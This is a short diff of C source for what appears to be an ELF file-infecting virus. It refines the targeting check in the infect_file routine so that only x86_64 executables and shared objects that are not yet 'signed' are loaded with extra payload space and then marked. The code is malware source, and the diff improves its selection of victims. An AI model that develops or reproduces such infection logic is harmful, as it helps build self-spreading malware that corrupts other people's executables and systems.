@@ -19,7 +19,7 @@ static int  is_dot_entry(const char *name)
     return 0;
 }
 
-static int  is_elf64(t_file file)
+static int  is_supported_elf(t_file file)
 {
     Elf64_Ehdr  *ehdr;
 
@@ -29,6 +29,10 @@ static int  is_elf64(t_file file)
     if (memcmp(ehdr->e_ident, ELFMAG, SELFMAG) != 0)
         return 0;
     if (ehdr->e_ident[EI_CLASS] != ELFCLASS64)
+        return 0;
+    if (ehdr->e_machine != EM_X86_64)
+        return 0;
+    if (ehdr->e_type != ET_EXEC && ehdr->e_type != ET_DYN)
         return 0;
     if (ehdr->e_phoff > file.size || ehdr->e_phentsize != sizeof(Elf64_Phdr))
         return 0;
@@ -49,14 +53,14 @@ static void infect_file(const char *path)
     if (!S_ISREG(st.st_mode) || st.st_size < (off_t)sizeof(Elf64_Ehdr))
         return;
     target = file_load(path, 0);
-    if (!is_elf64(target) || is_signed(target))
+    if (!is_supported_elf(target) || is_signed(target))
     {
         file_unload(target);
         return;
     }
     file_unload(target);
     target = file_load(path, PAYLOAD_BIN_SIZE);
-    if (is_elf64(target))
+    if (is_supported_elf(target))
         sign(target);
     else
         file_unload(target);
